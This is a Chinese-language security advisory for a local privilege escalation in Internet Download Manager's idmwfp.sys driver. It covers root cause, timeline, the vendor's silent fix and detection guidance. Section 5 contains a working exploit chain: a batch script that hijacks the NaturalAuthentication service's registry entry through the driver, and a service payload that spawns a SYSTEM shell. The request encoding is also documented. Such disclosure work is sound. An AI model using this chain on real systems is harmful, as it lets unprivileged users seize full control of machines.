# Internet Download Manager `idmwfp.sys` 内核注册表操作原语本地提权漏洞

| 项目 | 内容 |
| --- | --- |
| 漏洞编号 | CVE-2026-90493 (CNA: VulDB) |
| 联系方式 | kncrjvirx@gmail.com |
| 厂商 | Tonec Inc. / Internet Download Manager Corp. |
| 受影响产品 | Internet Download Manager **≤ 6.42 Build 63**（Windows） |
| 受影响组件 | `idmwfp.sys`（Internet Download Manager WFP Driver），Windows 内核驱动 |
| 设备接口 | `\\.\IDMWFP` |
| 漏洞类型 | 内核驱动访问控制缺失 / 暴露的 IOCTL 未做调用者鉴权（CWE-266、CWE-284） |
| 攻击向量 | 本地，低权限已认证用户，无需交互 |
| CVSS v3.1 | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`，8.8 |
| CVSS v4.0 | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P`，8.5 |

---

## 1. 摘要

`idmwfp.sys` 在初始化时用 `WdmlibIoCreateDeviceSecure` 创建设备对象 `\Device\IDMWFP`，并把安全描述符字符串 `D:P(A;;GA;;;AU)` 一并交给该例程。`AU` 是 Authenticated Users，`GA` 是 GENERIC_ALL。于是本机任何一个已认证用户都能以完全访问权限打开 `\\.\IDMWFP`，向它发送任意 `DeviceIoControl` 请求。

设备本身的权限过宽只提供了入口。真正的问题在主控制面的 `IRP_MJ_DEVICE_CONTROL` 处理例程 `sub_14000E9E0` 里：`IOCTL 0x12C028` 按请求包首字节分发子命令，其中 `0x0C`–`0x0F` 四个子命令全部进入同一个处理函数 `sub_140005B90`，而该函数在解析完用户输入之后，直接以驱动自身（内核）身份调用 `ZwOpenKey` / `ZwCreateKey` / `ZwQueryValueKey`、运行时解析的 `ZwSetValueKey`、`ZwDeleteValueKey`、`ZwDeleteKey`。

这条路径上没有任何鉴权：

- 没有检查调用者是谁，`IoGetRequestorProcessId` 在整个驱动里只被 `0x12C00C` 用来给 PID 策略对象打标记，注册表子命令一次都没调用它；
- 没有任何路径白名单，调用者提交的相对路径被原样拼接在 `\REGISTRY\MACHINE\` 或 `\REGISTRY\USER\` 之后；
- 没有冒充调用者线程（未调用 `SeAccessCheck` / `PsImpersonateClient` / `ZwAccessCheckAndAuditAlarm`），因此注册表对象的 ACL 根本不参与判定。

结果是：一个普通本地用户可以通过这个驱动，对 `HKLM` 与 `HKU` 下任意路径的注册表值执行读取、创建、修改、删除，从而实现本地权限提升（详见第5节）。

厂商未发布安全公告。IDM 6.43 系列的 `idmwfp64.sys` 6.43.1.91 中已出现命名空间白名单，`HKLM\SYSTEM\CurrentControlSet\Services\...` 这类路径不再被接受，属于静默修复。

---

## 2. 披露时间线

| 日期 | 事件 |
| --- | --- |
| 2026-05-01 | 发现漏洞 |
| 2026-05-06 | 尝试联系厂商，邮件发送至 `support@internetdownloadmanager.com` 与 `support@tonec.com`，未收到任何回应 |
| 2026-07-15 | 公开 PoC 与完整技术报告（当前仓库），并向 VulDB 提交 |
| 2026-09-13 | 分配编号 CVE-2026-90493 |

从首次联系厂商到 PoC 公开间隔 70 天，其间我方未收到厂商的任何回复，也未观察到厂商发布安全公告。厂商侧的修复以 6.43 系列驱动中的命名空间白名单形式静默落地，公开更新日志中没有任何一条提及驱动安全问题。

---

## 3. 影响范围

### 3.1 受影响版本

- 受影响范围：Internet Download Manager **6.42 Build 63 及之前的所有版本**
- 已确认存在漏洞的样本：`idmwfp.sys` 6.41.23.87（产品版本 6.41.23.1），随 Internet Download Manager 6.42 Build 63 分发。
- 已确认不再复现：`idmwfp64.sys` 6.43.1.91（产品版本 6.43.1.1），SHA-256 `8acffb0181146e96c44a94c5b364d657b775936ebb4d0fcce591068f74803c4a`，随 Internet Download Manager 6.43 Build 5 分发。该版本的注册表处理函数改为在操作前解码一段特权策略块，并对路径做允许/拒绝模式匹配（详见第 7 节）。
- 修复自 6.43 系列引入。厂商在同一时期把驱动文件名从 `idmwfp.sys` 改为 `idmwfp64.sys`，版本号跳到 6.43.x。

### 3.2 攻击面存在的前提

三个条件同时成立时攻击面存在：

1. 装有 Internet Download Manager。`idmwfp.sys` 不是可选组件，常规安装会把它放到 `%SystemRoot%\System32\drivers\`，并注册同名内核服务 `IDMWFP` 由服务控制管理器加载。
2. `IDMWFP` 服务处于运行状态。默认配置下自动运行。IDM 主程序是否打开与攻击面无关，驱动由 SCM 加载。
3. 本机存在任意一个普通本地账号且攻击者已控制。

---

## 4. 根因分析

### 4.1 设备对象对所有已认证用户开放

`DriverEntry@0x14000DC10` 中的相关代码：

```c
RtlInitUnicodeString(&DestinationString, L"\\Device\\IDMWFP");
RtlInitUnicodeString(&SymbolicLinkName, L"D:P(A;;GA;;;AU)");
Version = WdmlibIoCreateDeviceSecure(
            DriverObject,
            0,
            &DestinationString,
            0x12u,          // DeviceType = FILE_DEVICE_NETWORK
            0x100u,         // FILE_DEVICE_SECURE_OPEN
            0,
            &SymbolicLinkName,   // SDDL
            &DeviceClassGuid,
            &DeviceObject);
...
RtlInitUnicodeString(&SymbolicLinkName, L"\\DosDevices\\IDMWFP");
IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
```

SDDL `D:P(A;;GA;;;AU)` 只有一条 ACE：受托人 `AU`（Authenticated Users），掩码 `GA`（GENERIC_ALL），无继承标志。用户态 `CreateFileW(L"\\\\.\\IDMWFP", GENERIC_READ | GENERIC_WRITE, ...)` 因此对任何已登录用户都返回成功句柄。

### 4.2 主控制面与子命令分发

`DriverObject->MajorFunction[14]`（`IRP_MJ_DEVICE_CONTROL`）指向 `sub_14000E9E0`。该例程从 `IO_STACK_LOCATION` 取出 `Parameters.DeviceIoControl.IoControlCode`、`InputBufferLength`、`OutputBufferLength`，输入输出缓冲区共用 `Irp->AssociatedIrp.SystemBuffer`（METHOD_BUFFERED）。

已确认的 IOCTL：

| IOCTL | 入口 | 作用 |
| --- | --- | --- |
| `0x12C004` | 内联 | 查询指定 PID 的策略摘要 |
| `0x12C008` | `sub_140014330` | 建立/更新指定 PID 的策略与 TLV 规则 |
| `0x12C00C` | `sub_1400140E0` | 为指定 PID 绑定事件对象与重定向端口 |
| `0x12C010` | `sub_140013EB0` | 弹出指定 PID 的通知队列消息 |
| `0x12C014` / `0x12C018` | `sub_140015F90` | 活动流控制包装（opcode `0x80` / `0x81`） |
| `0x12C01C` | `sub_140014650` | 更新 PID 策略的扩展字段 |
| `0x12C020` | `sub_140015F90` | 活动流控制（调用者指定 opcode） |
| `0x12C024` | `sub_140010230` | 按端口对反查 PID |
| `0x12C028` | 子命令分发 | 注册表 / 文件 / WFP 辅助操作 |

`0x12C028` 的分发把请求首字节减去 9 作为跳转索引（`add eax, 0FFFFFFF7h; cmp eax, 7; ja default`），有效子命令为 `9`–`0x10`：

| 子命令 | 入口 | 作用 |
| --- | --- | --- |
| `9` | `sub_140005610` | 固定操作 `\SystemRoot\System32\drivers\etc\hosts` |
| `0x0A` | `sub_140003DA0` | 按条件值批量删除 WFP filter |
| `0x0B` | `sub_140005A40` | 删除固定路径下四个固定值（硬编码 IDM 许可信息） |
| **`0x0C`–`0x0F`** | **`sub_140005B90`** | **调用者指定路径的注册表读/写/删** |
| `0x10` | `sub_140006490` | 卷信息摘要查询 |

`sub_14000E9E0` 对每条子命令只做长度校验，随后直接调用处理函数，不做任何身份检查。

值得单独指出的是 `0x0B`：它要访问的正是 IDM 自己的命名空间 `\REGISTRY\MACHINE\SOFTWARE\Wow6432Node\Internet Download Manager`，路径与值名都硬编码在驱动里，用同一个 `D:P(A;;GA;;;AU)` 设备和同一套内联解码逻辑完成。这说明 IDM 完全有能力把注册表操作限制在自己的命名空间内，`0x0C`–`0x0F` 接受任意路径是一个独立的设计选择，并非能力所限。

### 4.3 缺失鉴权的注册表处理函数

`sub_140005B90(PRIV_CMD *input, ULONG input_len, ULONG output_len, ULONG *out_len)` 的入口检查只有三项：`input->mode <= 1`、`KeGetCurrentIrql() == 0`、根前缀字符串尚未解码时先做一次 XOR/ROL 常数解码。全部与调用者身份无关。

函数随后完成以下工作：

1. 读取 `path_offset`、`path_wchars`，校验 `path_wchars >= 0xA` 且 `input_len >= path_offset + 2 * path_wchars`；
2. 就地对这段 UTF-16 做逐字符解码；
3. 从后向前查找最后一个反斜杠，把字符串切成"相对键路径"和"值名"；如果值名恰好是单个 `@`，则改写为 `L'\0'`，即把操作目标指向键的默认值；
4. 按 `flags` 低位选择根前缀，把根前缀、键路径、终止符依次写入 UNICODE_STRING 缓冲区，值名通过 `ValueName.Buffer` 单独携带；
5. 进入 `switch (子命令)`，调用内核注册表 API。

第 4 步的根前缀是两条同样以 `(w ^ 0xDAAD) + 9555`、`ROR 16, (4+i) & 0xF` 编码的宽字符串，逐字解码结果为：

```text
xmmword_1400244D8 -> "\REGISTRY\MACHINE\"
xmmword_1400244B8 -> "\REGISTRY\USER\"
```

两个前缀的控制流是互斥的：`flags & 1` 走 MACHINE，否则只有 `flags & 2` 才走 USER，两者都不带时直接返回 `STATUS_INVALID_PARAMETER`。

四个子命令的注册表调用如下（偏移以 `PRIV_CMD` 起点计，`+0x0C` 是 data 区在包内的偏移、`+0x0E` 是 data 区的字节数）：

| 子命令 | 内核调用 | 权限 | 说明 |
| --- | --- | --- | --- |
| `0x0C` | `ZwOpenKey(KEY_QUERY_VALUE)` → `ZwQueryValueKey(KeyValuePartialInformation)` | 只读 | 输出缓冲区至少 16 字节；结果直接回写到同一个 SystemBuffer，前 4 字节被覆盖为返回长度 |
| `0x0D` | `ZwCreateKey(KEY_SET_VALUE)`（必要时逐级创建）→ `ZwSetValueKey` | 读写 | 先校验 `input_len >= data_offset + data_size`，随后解码数据区并写入 |
| `0x0E` | `ZwOpenKey(KEY_SET_VALUE)` → `ZwDeleteValueKey` | 写 | 值不存在（`STATUS_OBJECT_NAME_NOT_FOUND`）被视作成功 |
| `0x0F` | `ZwOpenKey(KEY_QUERY_VALUE \| DELETE)` → `ZwDeleteValueKey` → `ZwQueryKey(KeyFullInformation)` → `ZwDeleteKey` | 删 | 仅当键下子键数与值数均为 0 时才删键，否则返回 `STATUS_KEY_HAS_CHILDREN` |

`0x0D` 的逐级创建逻辑值得一提：它先用完整路径调用 `ZwCreateKey`，返回 `STATUS_OBJECT_NAME_NOT_FOUND` 时通过 `sub_140019C00`（在缓冲区里向前查找最后一个反斜杠）截断一级再试，直到成功；成功后再用 `sub_140019B70`（从指定偏移向后查找反斜杠）逐级把路径补全，每一级都单独 `ZwCreateKey`。因此多级不存在的键路径可以一次调用建成。

三处细节共同说明"鉴权被完全省略"：

- 全程没有调用 `IoGetRequestorProcessId`。该 API 在驱动里唯一的调用点在 `0x12C00C` 的处理路径（`0x14000EB65`），用途是把调用者 PID 写进策略对象，与注册表路径无关。
- 全程没有冒充调用者线程，也没有显式调用 `SeAccessCheck` 一类的访问检查。注册表操作在驱动自身的安全上下文里执行，被访问对象的 ACL 不参与判定。
- 路径拼接没有做任何字符过滤，`..`、`\`、`.` 全部原样进入对象管理器路径。

### 4.4 请求包与私有编码

`0x0C`–`0x0F` 共用同一个 20 字节头部，随后是路径区与数据区。以下结构按 IDA 中的字段命名整理，字段偏移与驱动读取位置一致：

```c
#pragma pack(push, 1)
typedef struct PRIV_CMD {
    uint8_t  subcmd;        // +0x00  0x0C / 0x0D / 0x0E / 0x0F
    uint8_t  mode;          // +0x01  必须 <= 1
    uint16_t reserved0;     // +0x02
    uint32_t flags;         // +0x04  bit0 = MACHINE 根, bit1 = USER 根, bit8..11 = 数据编码选项
    uint16_t path_offset;   // +0x08  路径区在包内的字节偏移
    uint16_t path_wchars;   // +0x0A  路径区的 UTF-16 字符数，须 >= 10
    uint16_t data_offset;   // +0x0C  数据区在包内的字节偏移
    uint16_t data_size;     // +0x0E  数据区字节数
    uint16_t value_type;    // +0x10  REG_SZ / REG_DWORD / ...
    uint8_t  seed0;         // +0x12  数据编码种子，0 时按 0xAD 处理
    uint8_t  seed1;         // +0x13  数据编码种子，0 时按 0xAD 处理
    /* +0x14: encoded_utf16_path[path_wchars] */
    /* 之后:   encoded_data[data_size]                */
} PRIV_CMD;
#pragma pack(pop)
```

攻击者可控的字段覆盖了注册表根（`flags` 低位）、相对键路径、值名、值类型、值内容以及编码参数。驱动只负责解码与转发。

接口使用两套私有编码，逆向成本有，但不构成安全边界：

**路径区**，按字符下标 `i` 从 0 开始，`rot = (4 + i) & 0xF`：

```c
decoded = ROR16((encoded ^ 0xDAAD) + 9555, rot);
```

**数据区**，按字节下标 `i` 从 0 开始，`rot = (4 + i) & 7`：

```c
decoded = ROR8((encoded ^ 0xAD) + 83, rot);
```

当 `flags & 0xF00` 非零时，`0x0D` 的写入路径与 `0x0C` 的查询路径会在此基础上再叠加一轮变换，分支条件取决于 `value_type`：

- `value_type ∈ {1, 2, 7}`（`REG_SZ` / `REG_EXPAND_SZ` / `REG_MULTI_SZ`）且 `flags & 0x600` 非零时，按 UTF-16 单位处理；其中 `flags & 0x400` 会再走一遍以 wchar 为单位的 Fisher-Yates 式置换（`sub_140005430`），随后必定再走一遍按字符的 `decoded = seed ^ (encoded - seed)` 变换（`sub_140005300`）；
- 其他类型且 `flags & 0x100` 非零时，走以 32 位为单位的置换（`sub_140005260`）。

`seed0` / `seed1` 分别作为这两条分支的种子参与运算，为 0 时按 `0xAD` 处理。默认情况下（仅带根选择位）这两轮变换不生效，普通 `REG_DWORD` / `REG_SZ` 读写只需要上面两条基础编解码。

`0x0C` 的输出是原生的 `KEY_VALUE_PARTIAL_INFORMATION`，前 12 字节为 `TitleIndex` / `Type` / `DataLength`，紧随其后的是经过同一套字节变换编码的数据。`METHOD_BUFFERED` 下输入输出共用同一个 SystemBuffer，驱动把返回长度写到 `+0x00..0x03`，即覆盖了调用者请求包的头部；`+0x04` 起的 `flags` 字段及包头之后的路径区、数据区不受影响。缓冲区不足时驱动返回 `STATUS_BUFFER_OVERFLOW` 或 `STATUS_BUFFER_TOO_SMALL`，回写位置相同。

---

## 5. PoC

### 5.1 攻击链概览

```text
普通本地用户 (Medium IL)
   └─ poc.bat
        ├─ [1] idmwfp_reg_demo.exe query          读回原始 ImagePath
        ├─ [2] idmwfp_reg_demo.exe set-expand-string  ImagePath  -> payload
        ├─ [3] idmwfp_reg_demo.exe set-dword          Start     -> 0x2  (自动)
        ├─ [4] idmwfp_reg_demo.exe set-dword          Type      -> 0x10 (独立进程)
        ├─ [5] idmwfp_reg_demo.exe set-multi-string   RequiredPrivileges -> 28 项
        ├─ [6] idmwfp_reg_demo.exe query          确认 ImagePath 已被改写
        └─ [7] sc start NaturalAuthentication
                 └─ SCM 以 LocalSystem 身份启动 payload
                      └─ StartProcessAsSystemInActiveSession() -> SYSTEM 交互式 cmd.exe
```

第 2 至第 5 步全部通过 `\\.\IDMWFP` 完成，攻击者不需要对该服务键有写权限。

### 5.2 改写服务注册表项

`poc.bat` ：

```bat
set base=%~dp0
set file=%base%payload.exe
.\idmwfp_reg_demo.exe query machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" 128
.\idmwfp_reg_demo.exe set-expand-string machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" %file%
.\idmwfp_reg_demo.exe set-dword machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\Start" 0x2
.\idmwfp_reg_demo.exe set-dword machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\Type" 0x10
.\idmwfp_reg_demo.exe set-multi-string machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\RequiredPrivileges" "SeTcbPrivilege|SeChangeNotifyPrivilege|..."
.\idmwfp_reg_demo.exe query machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" 128
sc start NaturalAuthentication
pause
```

### 5.3 为什么选中 NaturalAuthentication

选择目标服务需要两个条件同时成立，`NaturalAuthentication` 恰好都满足。

```text
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NaturalAuthentication]
"DisplayName"        = "@%systemroot%\system32\NaturalAuth.dll,-100"
"ImagePath"          = hex(2): "%SystemRoot%\system32\svchost.exe -k netsvcs -p"
"ObjectName"         = "LocalSystem"
"RequiredPrivileges" = hex(7): SeTcbPrivilege
                               SeChangeNotifyPrivilege
                               SeSystemEnvironmentPrivilege
"Start"              = dword:00000003   (SERVICE_DEMAND_START)
"Type"               = dword:00000020   (SERVICE_WIN32_SHARE_PROCESS)
"DependOnService"    = hex(7): RpcSs, ProfSvc, Schedule
```

**条件一，服务身份为 LocalSystem。** `ObjectName = LocalSystem`，服务本体以内核级身份运行，改掉入口即等于以 SYSTEM 执行载荷。

**条件二，普通用户有权启动该服务。** 大多数身份为 LocalSystem 的服务不能由普通用户手动启动。

### 5.4 取得 SYSTEM Shell

载荷是一个标准 Windows 服务程序，服务名硬编码为 `NaturalAuthentication`：

```cpp
constexpr char kServiceName[] = "NaturalAuthentication";

void WINAPI ServiceMain(DWORD, LPSTR*) {
    g_status_handle = RegisterServiceCtrlHandlerA(kServiceName, ServiceControlHandler);
    ...
    session0_launcher::StartProcessAsSystemInActiveSession(
        L"C:\\Windows\\system32\\cmd.exe",
        L"cmd.exe"
    );
    ...
}

int main(int argc, char* argv[]) {
    SERVICE_TABLE_ENTRYA service_table[] = {
        {const_cast<LPSTR>(kServiceName), ServiceMain},
        {nullptr, nullptr},
    };
    if (!StartServiceCtrlDispatcherA(service_table)) { ... }
}
```

服务名必须与被劫持的服务一致，否则 SCM 与进程之间的 `StartServiceCtrlDispatcher` 握手会失败。

最后一步是跨会话启动。服务由 SCM 在会话 0 启动，即使令牌是 SYSTEM，进程也处在一个没有交互桌面的会话里。 `StartProcessAsSystemInActiveSession` 完成以下动作：

1. `WTSEnumerateSessionsW` 枚举会话，取第一个 `WTSActive` 的会话 ID，失败时回退到 `WTSGetActiveConsoleSessionId`；
2. `OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE)`，并用 `EqualSid` 校验当前令牌的用户 SID 确实是 `S-1-5-18`，否则直接失败；
3. `DuplicateTokenEx(..., TokenPrimary)` 复制出主令牌；
4. `SetTokenInformation(TokenSessionId)` 把令牌的会话 ID 改为当前活动交互会话；
5. `CreateEnvironmentBlock` + `CreateProcessAsUserW(..., lpDesktop = L"winsta0\\default", ...)` 在交互桌面上拉起 `cmd.exe`。

### 5.5 使用与善后

环境准备与执行：

```powershell
# 1. 安装 IDM（本目录中的官方安装包）
.\poc\idman642build63.exe

# 2. 确认驱动已由 SCM 加载
sc.exe query IDMWFP

# 3. 以普通用户身份执行整条链
cd .\poc
.\poc.bat
```

`poc.bat` 提交的四个值在服务器上都可以用同一条原语还原。`backup.reg` 提供了完整的原始配置，双击导入即可，或在管理员环境下执行：

```powershell
sc.exe stop NaturalAuthentication
reg.exe import .\poc\backup.reg
```

---

## 6. 影响

| 维度 | 评估 |
| --- | --- |
| 机密性 | 高。可读取 `HKLM` / `HKU` 任意路径的注册表值，包括其它用户 hive 与安全组件配置 |
| 完整性 | 高。可创建、修改、删除任意注册表值，并可删除空键 |
| 可用性 | 高。可删除受保护配置、破坏服务定义，导致系统组件无法启动 |
| 权限提升 | 是。普通本地用户可达 LocalSystem |
| 持久化 | 是。可直接改写服务、驱动、自启动项定义 |
| 用户交互 | 不需要 |
| 跨权限边界 | 是。可访问其他用户 SID 的 hive 与安全产品配置 |

---

## 7. 厂商响应与修复状态

厂商未发布安全公告，也未就本报告作出回应。截至本文写作时，公开更新日志中没有任何一条提到驱动安全问题。

受影响范围至 6.42 Build 63。厂商在尝试联系后静默进行了修复：IDM 6.43 Build 5 分发的 `idmwfp64.sys` 6.43.1.91 中，对应 `sub_140005B90` 的函数位于 `0x1400065B0`，入口处多了一次特权字符串块解码，随后在注册表操作之前对路径做模式匹配：

```text
0x140006643  call 0x140005620            ; 解码特权字符串块
0x140006885  加载允许/根模式表，长度 0x6E WCHAR
0x1400068BD  对解码后的输入路径调用模式匹配
0x1400068C9  无匹配则返回 STATUS_OBJECT_PATH_INVALID
0x140006913  加载拒绝组件模式表，长度 0x6B WCHAR
0x14000694B  对路径组件调用模式匹配
0x140006A5B  组件被命中或切分非法则返回 STATUS_OBJECT_NAME_INVALID
```

还原出的两张策略表：

```text
允许的根：
  SOFTWARE\Internet Download Manager\*
  SOFTWARE\WOW6432Node\Internet Download Manager\*
  SOFTWARE\Classes\CLSID\*

拒绝的路径组件：
  AppID
  *ProgID
  InprocServer*
  LocalServer*
  InprocHandler*
  PersistentHandler*
  TypeLib
  TreatAs
  DefaultExtension
```

就本漏洞的直接利用路径而言这个修复是有效的（`HKLM\SYSTEM\CurrentControlSet\Services\...` 不匹配允许表），但它把设备接口继续留给所有已认证用户，设备上其余 IOCTL（跨 PID 策略下发、事件绑定、通知队列读取、WFP filter 删除等）的暴露面并未收窄，这些接口自身也不带调用者校验。

---

## 8. 检测与排查

本漏洞的利用在注册表层面会留下痕迹，可重点核对：

- `HKLM\SYSTEM\CurrentControlSet\Services\*\ImagePath` 是否指向非 `%SystemRoot%` 路径，或指向用户可写目录；
- `RequiredPrivileges` 是否包含 `SeTcbPrivilege` 之外的大量特权，尤其是 `SeDebugPrivilege`、`SeLoadDriverPrivilege`、`SeBackupPrivilege`、`SeRestorePrivilege` 同时出现；
- 系统日志中服务安装/配置变更事件（4697、7040、7045）与 `Microsoft-Windows-Kernel-...` 无关的注册表写入之间是否存在时间对应。
